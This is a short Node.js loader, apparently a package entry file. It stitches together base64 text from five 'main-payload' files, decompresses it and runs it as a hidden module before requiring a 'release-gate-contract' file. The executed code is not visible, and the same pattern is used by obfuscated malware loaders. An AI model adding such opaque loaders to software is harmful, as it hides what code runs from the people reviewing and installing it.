"use strict";
const zlib=require("zlib"),Module=require("module"),path=require("path");
const source=zlib.gunzipSync(Buffer.from(require("./main-payload-01")+require("./main-payload-02a")+require("./main-payload-02b")+require("./main-payload-02c")+require("./main-payload-02d"),"base64")).toString("utf8");
const runtime=new Module(__filename,module);runtime.filename=__filename;runtime.paths=Module._nodeModulePaths(path.dirname(__filename));runtime._compile(source,__filename);
require("./release-gate-contract");
